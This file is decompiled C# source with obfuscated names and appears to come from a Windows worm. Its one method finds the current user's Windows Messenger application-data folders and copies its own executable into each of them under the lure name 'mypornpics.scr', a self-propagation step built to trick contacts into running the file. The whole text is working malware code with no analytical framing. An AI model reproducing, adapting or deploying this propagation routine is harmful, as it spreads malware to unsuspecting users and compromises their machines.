using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace ns3;

internal sealed class Class11
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static void smethod_0()
	{
		int try0001_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		int num5 = default(int);
		string executablePath = default(string);
		string[] directories = default(string[]);
		string text = default(string);
		int upperBound = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				int num6;
				int num7;
				switch (try0001_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = -2;
					goto IL_0009;
				case 323:
					{
						num2 = num;
						if (num3 > -2)
						{
							switch (num3)
							{
							case 1:
								break;
							default:
								goto end_IL_0001;
							}
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0009;
						case 3:
							goto IL_0018;
						case 4:
							goto IL_0020;
						case 5:
							goto IL_003c;
						case 6:
							goto IL_005c;
						case 7:
							goto IL_0061;
						case 8:
							goto IL_0063;
						case 9:
							goto IL_006d;
						case 10:
							goto IL_0087;
						case 11:
							goto IL_00a9;
						case 12:
							goto IL_00c5;
						case 13:
						case 14:
						case 15:
							goto IL_00dd;
						default:
							goto end_IL_0001;
						case 16:
						case 17:
							goto end_IL_0001_2;
						}
						goto default;
					}
					IL_00dd:
					num = 15;
					num5 = checked(num5 + 1);
					goto IL_007d;
					IL_00c5:
					num = 12;
					File.Copy(executablePath, directories[num5] + "\\mypornpics.scr");
					goto IL_00dd;
					IL_0009:
					num = 2;
					_ = Assembly.GetExecutingAssembly().GetModules()[0];
					goto IL_0018;
					IL_0018:
					num = 3;
					executablePath = Application.get_ExecutablePath();
					goto IL_0020;
					IL_0020:
					num = 4;
					text = "C:\\Documents and Settings\\" + Interaction.Environ("USERNAME") + "\\Local Settings\\Application Data\\Microsoft\\Messenger\\";
					goto IL_003c;
					IL_003c:
					num = 5;
					if (Operators.CompareString(FileSystem.Dir(text, (FileAttribute)16), "", false) == 0)
					{
						goto end_IL_0001_2;
					}
					goto IL_005c;
					IL_005c:
					num = 6;
					num5 = 0;
					goto IL_0061;
					IL_0061:
					num = 7;
					goto IL_0063;
					IL_0063:
					num = 8;
					directories = Directory.GetDirectories(text);
					goto IL_006d;
					IL_006d:
					num = 9;
					upperBound = directories.GetUpperBound(0);
					num5 = 0;
					goto IL_007d;
					IL_007d:
					num6 = num5;
					num7 = upperBound;
					if (num6 > num7)
					{
						goto end_IL_0001_2;
					}
					goto IL_0087;
					IL_0087:
					num = 10;
					if (Operators.CompareString(FileSystem.Dir(directories[num5], (FileAttribute)16), "", false) != 0)
					{
						goto IL_00a9;
					}
					goto IL_00dd;
					IL_00a9:
					num = 11;
					if (!File.Exists(directories[num5] + "\\mypornpics.scr"))
					{
						goto IL_00c5;
					}
					goto IL_00dd;
					end_IL_0001:
					break;
				}
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 323;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_2:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}
}
